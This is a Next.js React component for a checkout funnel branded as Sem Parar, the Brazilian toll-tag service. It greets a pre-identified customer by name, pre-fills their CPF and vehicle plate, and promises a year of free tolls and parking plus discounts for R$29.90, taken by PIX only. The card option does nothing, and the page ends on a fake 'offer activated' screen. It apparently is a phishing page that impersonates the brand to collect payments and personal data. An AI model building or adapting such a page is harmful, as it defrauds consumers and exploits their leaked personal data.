'use client';

import { useState, useEffect } from 'react';
import Image from 'next/image';

interface LeadData {
  nrc: number;
  nome: string;
  firstName: string;
  email: string;
  cpf: string;
  cidade: string;
  estado: string;
  placas: string[];
  tags: string[];
  planos: string[];
  qtdVeiculos: number;
  situacao: number;
  mensalidadeAtual: number;
}

interface PixData {
  id: string;
  qrCodeBase64: string;
  copyPaste: string;
  amount: number;
  expiresAt: string;
}

export default function FunnelClient({ lead }: { lead: LeadData }) {
  const [step, setStep] = useState<'offer' | 'checkout' | 'success'>('offer');
  const [loading, setLoading] = useState(false);
  const [showTerms, setShowTerms] = useState(false);
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [paymentStatus, setPaymentStatus] = useState<'pending' | 'paid'>('pending');
  const [copied, setCopied] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState<'pix' | 'card'>('pix');
  const [formData, setFormData] = useState({
    name: lead.nome || '',
    cpf: lead.cpf || '',
    placa: lead.placas[0] || '',
  });

  const promoPrice = 29.90;
  const mensalidadeAtual = lead.mensalidadeAtual || 49.90;
  const custoAnualAtual = mensalidadeAtual * 12;
  const descontoPct = Math.round((1 - promoPrice / custoAnualAtual) * 100);

  const handleCopyPix = () => {
    if (pixData?.copyPaste) {
      navigator.clipboard.writeText(pixData.copyPaste);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const generatePix = async () => {
    if (!formData.name || !formData.cpf) return;

    setLoading(true);
    try {
      const response = await fetch('/api/pix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          nrc: lead.nrc,
          name: formData.name,
          email: lead.email,
          cpf: formData.cpf,
          amount: promoPrice,
        }),
      });

      if (!response.ok) throw new Error('Falha ao gerar PIX');

      const pix = await response.json();
      setPixData(pix);
    } catch (error) {
      alert('Erro ao gerar pagamento. Tente novamente.');
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  const handleConfirm = async () => {
    if (paymentMethod === 'pix' && !pixData) {
      await generatePix();
    }
  };

  useEffect(() => {
    if (!pixData?.id || paymentStatus !== 'pending') return;

    const checkStatus = async () => {
      try {
        const response = await fetch(`/api/pix?id=${pixData.id}`);
        const data = await response.json();
        if (data.status === 'paid' || data.status === 'approved' || data.status === 'completed') {
          setPaymentStatus('paid');
          setStep('success');
        }
      } catch (error) {
        console.error('Error checking payment:', error);
      }
    };

    const interval = setInterval(checkStatus, 5000);
    return () => clearInterval(interval);
  }, [pixData?.id, paymentStatus]);

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <header className="bg-white border-b border-[#e6e6e6]">
        <div className="max-w-[500px] mx-auto px-4 py-3 flex items-center justify-center">
          <Image src="/logo.png" alt="Sem Parar" width={100} height={28} className="h-7 w-auto" />
        </div>
      </header>

      {/* TELA 2: Pagina da Oferta */}
      {step === 'offer' && (
        <main className="flex-1 max-w-[500px] mx-auto px-4 py-6 w-full">
          {/* Badge */}
          <div className="text-center mb-6">
            <span className="inline-block bg-[#0e0d0d] text-white text-xs font-semibold px-4 py-2 rounded-md tracking-wide">
              OFERTA EXCLUSIVA - BLACK FRIDAY
            </span>
          </div>

          {/* Titulo */}
          <div className="text-center mb-6">
            <h1 className="text-[#0e0d0d] text-2xl font-bold mb-3">
              {lead.firstName.toUpperCase()}, voce foi selecionado!
            </h1>
            <p className="text-[#666] text-base">
              De <span className="line-through">R$ {mensalidadeAtual.toFixed(2).replace('.', ',')}/mes</span> por
            </p>
            <p className="text-[#d60b52] text-3xl font-bold mt-1">
              R$ {promoPrice.toFixed(2).replace('.', ',')}/ano inteiro
            </p>
            <p className="text-[#666] text-sm mt-1">({descontoPct}% desconto)</p>
          </div>

          {/* Beneficios Grid 2x2 */}
          <div className="grid grid-cols-2 gap-3 mb-6">
            {[
              { icon: '🚗', title: '1 Ano Sem Pedagio' },
              { icon: '🅿️', title: '1 Ano Sem Estacionamento' },
              { icon: '🍔', title: '30% McDonald\'s' },
              { icon: '⛽', title: '-R$ 0,20/litro' },
            ].map((item, i) => (
              <div key={i} className="bg-[#f8f8f8] rounded-xl p-4 text-center">
                <span className="text-3xl mb-2 block">{item.icon}</span>
                <p className="text-[#0e0d0d] text-sm font-medium">{item.title}</p>
              </div>
            ))}
          </div>

          {/* CTA */}
          <button
            onClick={() => setStep('checkout')}
            className="w-full bg-[#0e0d0d] hover:bg-[#333] text-white font-semibold text-base py-4 rounded-xl transition-colors mb-4"
          >
            Quero aproveitar esta oferta
          </button>

          {/* Link termos */}
          <button
            onClick={() => setShowTerms(!showTerms)}
            className="w-full text-[#666] text-sm underline hover:text-[#0e0d0d] transition-colors"
          >
            Esclarecer regras e termos de uso!
          </button>

          {showTerms && (
            <div className="mt-4 bg-[#f8f8f8] rounded-xl p-4 text-[#666] text-xs">
              <p className="mb-2"><strong>Termos da oferta:</strong></p>
              <ul className="list-disc pl-4 space-y-1">
                <li>Oferta valida para novembro/2024</li>
                <li>Desconto aplicado na mensalidade do primeiro ano</li>
                <li>Beneficios de pedagio e estacionamento sujeitos a disponibilidade</li>
                <li>Desconto em combustivel valido em postos parceiros</li>
                <li>Apos 12 meses, valor retorna ao plano contratado</li>
              </ul>
            </div>
          )}
        </main>
      )}

      {/* TELA 3: Checkout */}
      {step === 'checkout' && (
        <main className="flex-1 max-w-[500px] mx-auto px-4 py-6 w-full">
          {/* Header */}
          <div className="text-center mb-6">
            <h1 className="text-[#0e0d0d] text-xl font-bold">
              Finalizar Assinatura Black Friday
            </h1>
          </div>

          {/* Resumo do plano */}
          <div className="bg-[#f8f8f8] rounded-xl p-4 mb-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-[#0e0d0d] font-medium text-sm">Plano Anual Sem Parar</p>
                <p className="text-[#666] text-xs">+ Beneficios Black Friday</p>
              </div>
              <p className="text-[#0e0d0d] text-2xl font-bold">R$ {promoPrice.toFixed(2).replace('.', ',')}</p>
            </div>
          </div>

          {/* Dados de Cadastro */}
          <div className="mb-6">
            <p className="text-[#666] text-xs font-semibold tracking-wider mb-3">DADOS DE CADASTRO</p>
            <div className="space-y-3">
              <input
                type="text"
                value={formData.name}
                onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] text-sm focus:outline-none focus:border-[#d60b52]"
                placeholder="Nome"
              />
              <div className="grid grid-cols-2 gap-3">
                <input
                  type="text"
                  value={formData.cpf}
                  onChange={(e) => setFormData({ ...formData, cpf: e.target.value })}
                  className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] text-sm focus:outline-none focus:border-[#d60b52]"
                  placeholder="CPF"
                />
                <input
                  type="text"
                  value={formData.placa}
                  onChange={(e) => setFormData({ ...formData, placa: e.target.value })}
                  className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] text-sm focus:outline-none focus:border-[#d60b52]"
                  placeholder="Placa/Veiculo"
                />
              </div>
            </div>
          </div>

          {/* Forma de Pagamento */}
          <div className="mb-6">
            <p className="text-[#666] text-xs font-semibold tracking-wider mb-3">FORMAS DE PAGAMENTO</p>
            <select
              value={paymentMethod}
              onChange={(e) => setPaymentMethod(e.target.value as 'pix' | 'card')}
              className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] text-sm focus:outline-none focus:border-[#d60b52] bg-white"
            >
              <option value="pix">PIX</option>
              <option value="card">Cartao de Credito</option>
            </select>
          </div>

          {/* QR Code PIX (se ja gerado) */}
          {pixData && paymentMethod === 'pix' && (
            <div className="bg-[#f8f8f8] rounded-xl p-4 mb-6 text-center">
              <p className="text-[#666] text-xs mb-3">Escaneie o QR Code ou copie o codigo</p>
              {pixData.qrCodeBase64 && (
                <img src={`data:image/png;base64,${pixData.qrCodeBase64}`} alt="QR Code" className="w-40 h-40 mx-auto mb-3" />
              )}
              <div className="flex gap-2">
                <code className="flex-1 text-[#0e0d0d] text-xs bg-white border border-[#e6e6e6] rounded-lg p-2 text-left truncate">
                  {pixData.copyPaste}
                </code>
                <button
                  onClick={handleCopyPix}
                  className="bg-[#0e0d0d] text-white text-xs font-semibold px-3 py-2 rounded-lg"
                >
                  {copied ? '✓' : 'Copiar'}
                </button>
              </div>
              <p className="text-[#666] text-xs mt-3 flex items-center justify-center gap-2">
                <span className="w-2 h-2 bg-[#f59e0b] rounded-full animate-pulse"></span>
                Aguardando pagamento...
              </p>
            </div>
          )}

          {/* Selos de seguranca */}
          <div className="flex items-center justify-center gap-6 mb-6">
            <div className="flex items-center gap-2 text-[#666] text-xs">
              <span className="text-lg">🔒</span>
              <span>Pagamento<br/>100% Seguro</span>
            </div>
            <div className="flex items-center gap-2 text-[#666] text-xs">
              <span className="text-lg">✓</span>
              <span>Selos de<br/>Seguranca</span>
            </div>
          </div>

          {/* CTA */}
          <button
            onClick={handleConfirm}
            disabled={loading || !formData.name || !formData.cpf}
            className="w-full bg-[#d60b52] hover:bg-[#b20944] text-white font-semibold text-base py-4 rounded-xl transition-colors disabled:opacity-50 disabled:cursor-not-allowed mb-3"
          >
            {loading ? 'Processando...' : 'Confirmar e Ativar Oferta'}
          </button>

          <button
            onClick={() => setStep('offer')}
            className="w-full text-[#666] text-sm py-2 hover:text-[#0e0d0d] transition-colors"
          >
            ← Voltar
          </button>
        </main>
      )}

      {/* TELA 4: Sucesso */}
      {step === 'success' && (
        <main className="flex-1 max-w-[500px] mx-auto px-4 py-10 w-full text-center">
          {/* Check icon */}
          <div className="w-20 h-20 bg-[#f0fdf4] rounded-full flex items-center justify-center mx-auto mb-6">
            <span className="text-[#16a34a] text-4xl">✓</span>
          </div>

          {/* Titulo */}
          <h1 className="text-[#0e0d0d] text-2xl font-bold mb-2">
            Oferta Ativada com Sucesso!
          </h1>
          <p className="text-[#666] text-base mb-8">
            Seu Sem Parar ja esta ativo com os beneficios de Black Friday
          </p>

          {/* Logo */}
          <div className="mb-8">
            <Image src="/logo.png" alt="Sem Parar" width={80} height={24} className="h-6 w-auto mx-auto" />
          </div>

          {/* Proximos passos */}
          <div className="bg-[#f8f8f8] rounded-xl p-6 text-left">
            <div className="space-y-4">
              <div className="flex items-start gap-4">
                <span className="text-2xl">📦</span>
                <div>
                  <p className="text-[#0e0d0d] font-medium">Envio da TAG para sua casa</p>
                  <p className="text-[#666] text-sm">Chegara em ate 7 dias uteis</p>
                </div>
              </div>
              <div className="flex items-start gap-4">
                <span className="text-2xl">📱</span>
                <div>
                  <p className="text-[#0e0d0d] font-medium">Acesse o App para usar os descontos</p>
                  <p className="text-[#666] text-sm">Baixe na App Store ou Google Play</p>
                </div>
              </div>
              <div className="flex items-start gap-4">
                <span className="text-2xl">✉️</span>
                <div>
                  <p className="text-[#0e0d0d] font-medium">E-mail de confirmacao enviado</p>
                  <p className="text-[#666] text-sm">Verifique sua caixa de entrada</p>
                </div>
              </div>
            </div>
          </div>
        </main>
      )}

      {/* Footer */}
      <footer className="border-t border-[#e6e6e6] py-4">
        <div className="max-w-[500px] mx-auto px-4 text-center">
          <p className="text-[#999] text-xs">
            Sem Parar · DBTrans Internet Ltda.
          </p>
        </div>
      </footer>
    </div>
  );
}
